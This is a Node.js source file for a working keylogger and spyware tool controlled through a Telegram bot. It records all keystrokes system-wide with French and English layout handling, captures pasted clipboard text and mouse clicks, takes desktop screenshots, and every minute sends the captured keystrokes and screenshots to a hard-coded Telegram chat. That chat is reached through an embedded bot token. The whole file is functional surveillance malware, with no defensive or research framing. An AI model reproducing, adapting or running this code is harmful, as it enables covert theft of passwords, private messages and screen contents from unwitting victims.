process.env.NTBA_FIX_350 = 1; 

const fs = require('fs');
const path = require('path');
const { exec } = require('child_process'); // <-- NEW: For Smart OS Scanning
const screenshot = require('screenshot-desktop');
const { GlobalKeyboardListener } = require("node-global-key-listener");
const clipboardy = require('clipboardy'); 
const TelegramBot = require('node-telegram-bot-api');

const TELEGRAM_TOKEN = '8592923504:AAFla_fYXwzOwgZETvmkc-E9VJFXvAGyN4I'; 
const TELEGRAM_CHAT_ID = '1076235580'; 

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

const memoryFile = path.join(__dirname, '.layout_state');
let currentLayout = 'QWERTY'; 

function switchLayout(newLayout) {
    currentLayout = newLayout;
    try { fs.writeFileSync(memoryFile, currentLayout); } catch (e) {}
}

if (fs.existsSync(memoryFile)) {
    currentLayout = fs.readFileSync(memoryFile, 'utf8').trim();
}


exec('powershell -NoProfile -Command "(Get-Culture).TwoLetterISOLanguageName"', (err, stdout) => {
    if (!err && stdout) {
        const osLang = stdout.trim().toLowerCase();
        if (osLang === 'fr') {
            switchLayout('AZERTY');
            console.log("🌍 [SMART BOOT] Windows detected as French. Auto-locking to AZERTY.");
        } else if (osLang === 'en') {
            switchLayout('QWERTY');
            console.log("🌍 [SMART BOOT] Windows detected as English. Auto-locking to QWERTY.");
        }
    }
});

let isRecordingKeys = true;
let isRecordingScreen = true;


const controlMenu = {
    reply_markup: {
        keyboard: [
            ['📊 Status', '📸 Screenshot'],
            ['🟢 Keys ON', '🔴 Keys OFF'],
            ['🟢 Screen ON', '🔴 Screen OFF'],
            ['🌍 AZERTY (French)', '🌍 QWERTY (English)'] // <-- Your new buttons are right here!
        ],
        resize_keyboard: true, 
        is_persistent: true
    }
};

bot.on('message', async (msg) => {
    const chatId = msg.chat.id.toString();
    const text = msg.text ? msg.text.trim().toLowerCase() : '';

    if (text === '/ping') return;
    if (chatId !== TELEGRAM_CHAT_ID.toString()) return;

    if (text === '/help' || text === '/start') {
        bot.sendMessage(chatId, "🎮 **Control Panel Unlocked!**", controlMenu);
    }
    else if (text.includes('status')) {
        const statusMsg = `📊 **Current RDP Status:**\n⌨️ Keys: ${isRecordingKeys ? '✅ ON' : '❌ OFF'}\n📸 Screen: ${isRecordingScreen ? '✅ ON' : '❌ OFF'}\n🌍 Layout: **${currentLayout}**`;
        bot.sendMessage(chatId, statusMsg);
    } 
    else if (text.includes('azerty')) {
        switchLayout('AZERTY'); 
        bot.sendMessage(chatId, "🌍 **Layout Locked to AZERTY. (Saved to memory)**");
    }
    else if (text.includes('qwerty') || text.includes('qerty')) { 
        switchLayout('QWERTY'); 
        bot.sendMessage(chatId, "🌍 **Layout Locked to QWERTY. (Saved to memory)**");
    }
    else if (text.includes('screenshot') || text.includes('/shot')) {
        bot.sendMessage(chatId, "📸 *Capturing screen...*");
        try {
            const imgBuffer = await screenshot({ format: 'png' });
            await bot.sendPhoto(chatId, imgBuffer);
        } catch (err) {}
    }
    else if (text.includes('keys on')) { isRecordingKeys = true; bot.sendMessage(chatId, "✅ Keylogging enabled."); } 
    else if (text.includes('keys off')) { isRecordingKeys = false; bot.sendMessage(chatId, "❌ Keylogging disabled."); } 
    else if (text.includes('screen on')) { isRecordingScreen = true; bot.sendMessage(chatId, "✅ Screenshots enabled."); } 
    else if (text.includes('screen off')) { isRecordingScreen = false; bot.sendMessage(chatId, "❌ Screenshots disabled."); } 
});


let keyBuffer = ""; 
const listener = new GlobalKeyboardListener();

let isCapsOn = false; let isShiftDown = false; let isCtrlDown = false; let isAltGrDown = false; 
let isLeftAltDown = false; let isMetaDown = false; 

const ignoredKeys = ["UP ARROW", "DOWN ARROW", "LEFT ARROW", "RIGHT ARROW"]; 

const qwertySymbolMap = {
    "SQUARE BRACKET OPEN": ["[", "{"], "SQUARE BRACKET CLOSE": ["]", "}"], "EQUALS": ["=", "+"], "SEMICOLON": [";", ":"], "QUOTE": ["'", "\""],
    "BACKSLASH": ["\\", "|"], "FORWARD SLASH": ["/", "?"], "DOT": [".", ">"], "COMMA": [",", "<"], "MINUS": ["-", "_"], 
    "BACKQUOTE": ["`", "~"], "BACKTICK": ["`", "~"], "SECTION": ["§", "±"]
};

const azertySymbolMap = {
    "SQUARE BRACKET OPEN": ["^", "¨"], "SQUARE BRACKET CLOSE": ["$", "£"], "EQUALS": ["=", "+"], 
    "SEMICOLON": ["m", "M"], "QUOTE": ["ù", "%"], "BACKSLASH": ["*", "µ"], 
    "FORWARD SLASH": [":", "/"], "SECTION": ["!", "§"], 
    "DOT": [";", "."], "COMMA": [",", "?"], "MINUS": [")", "°"], 
    "BACKQUOTE": ["²", "²"], "BACKTICK": ["²", "²"]
};

const qwertyNumberShiftMap = { "1": "!", "2": "@", "3": "#", "4": "$", "5": "%", "6": "^", "7": "&", "8": "*", "9": "(", "0": ")" };
const azertyNumberRow = { "1": "&", "2": "é", "3": "\"", "4": "'", "5": "(", "6": "-", "7": "è", "8": "_", "9": "ç", "0": "à" };

const azertyAltMap = {
    "ALTGR_0": "@", "ALTGR_2": "~", "ALTGR_3": "#", "ALTGR_4": "{", "ALTGR_5": "[", 
    "ALTGR_6": "|", "ALTGR_7": "`", "ALTGR_8": "\\", "ALTGR_9": "^", "ALTGR_E": "€", 
    "ALTGR_RIGHT BRACKET": "]", "ALTGR_EQUALS": "}"
};

listener.addListener(function (e, down) {
    if (!isRecordingKeys) return;
    
    if (e.name === "LEFT META" || e.name === "RIGHT META") { isMetaDown = (e.state === "DOWN"); return; }
    if (e.name === "LEFT ALT") { isLeftAltDown = (e.state === "DOWN"); return; }
    if (e.name === "RIGHT ALT") { isAltGrDown = (e.state === "DOWN"); return; }
    if (e.name === "LEFT CTRL" || e.name === "RIGHT CTRL") { isCtrlDown = (e.state === "DOWN"); return; }

    if (e.name === "LEFT SHIFT" || e.name === "RIGHT SHIFT") { 
        isShiftDown = (e.state === "DOWN"); 
        if (isLeftAltDown && e.state === "DOWN") {
            const newLayout = (currentLayout === 'QWERTY') ? 'AZERTY' : 'QWERTY';
            switchLayout(newLayout); 
            const msg = `\n[🔄 OS LANGUAGE SWAPPED TO ${currentLayout}]\n`;
            keyBuffer += msg; process.stdout.write(msg);
        }
        return; 
    }

    if (e.state === "DOWN") {
        
        if (isMetaDown && e.name === "SPACE") {
            const newLayout = (currentLayout === 'QWERTY') ? 'AZERTY' : 'QWERTY';
            switchLayout(newLayout); 
            const msg = `\n[🔄 OS LANGUAGE SWAPPED TO ${currentLayout}]\n`;
            keyBuffer += msg; process.stdout.write(msg);
            return;
        }

        if (e.name && e.name.includes("MOUSE")) {
            if (e.name === "MOUSE LEFT") { keyBuffer += " [CLICK] "; process.stdout.write(" [CLICK] "); }
            return;
        }

        if (isCtrlDown && !isAltGrDown) {
            if (e.name === "V") { 
                try { const pastedText = clipboardy.readSync(); keyBuffer += `\n[PASTED: "${pastedText}"]\n`; } catch (err) {}
            } else if (e.name === "BACKSPACE") { 
                keyBuffer += " [CTRL+BACKSPACE] "; process.stdout.write(" [CTRL+BACKSPACE] ");
            }
            return; 
        }

        if (ignoredKeys.includes(e.name)) return;

        let output = '';
        if (e.name === "CAPS LOCK") { isCapsOn = !isCapsOn; return; }
        
        if (e.name === "BACKSPACE") {
            if (keyBuffer.length > 0) { keyBuffer = keyBuffer.slice(0, -1); process.stdout.write('\b \b'); }
            return; 
        }

        const currentSymbolMap = (currentLayout === 'QWERTY') ? qwertySymbolMap : azertySymbolMap;

        if (currentLayout === 'AZERTY' && isAltGrDown && azertyAltMap[`ALTGR_${e.name}`]) {
            output = azertyAltMap[`ALTGR_${e.name}`];
        } 
        else if (currentSymbolMap[e.name]) {
            output = isShiftDown ? currentSymbolMap[e.name][1] : currentSymbolMap[e.name][0];
        } 
        else if (e.name === "SPACE") output = ' ';
        else if (e.name === "RETURN") output = '\n';
        else if (e.name === "TAB") output = '\t';
        else if (e.name.length === 1) {
            const isLetter = /[A-Z]/.test(e.name);
            if (isLetter) {
                output = ((isCapsOn && !isShiftDown) || (!isCapsOn && isShiftDown)) ? e.name : e.name.toLowerCase();
            } else {
                if (currentLayout === 'QWERTY') output = (isShiftDown && qwertyNumberShiftMap[e.name]) ? qwertyNumberShiftMap[e.name] : e.name.toLowerCase();
                else if (currentLayout === 'AZERTY') output = isShiftDown ? e.name : (azertyNumberRow[e.name] || e.name);
            }
        } else {
            output = `[${e.name}]`;
        }

        if (output) { keyBuffer += output; process.stdout.write(output); }
    }
});

setInterval(async () => {
    try {
        if (isRecordingKeys && keyBuffer.trim().length > 0) {
            const textToSend = keyBuffer; keyBuffer = ""; 
            await bot.sendMessage(TELEGRAM_CHAT_ID, `⌨️ **Keystrokes (${currentLayout}):**\n${textToSend}`);
        }
        if (isRecordingScreen) {
            const imgBuffer = await screenshot({ format: 'png' });
            await bot.sendPhoto(TELEGRAM_CHAT_ID, imgBuffer);
        }
    } catch (error) {}
}, 60000);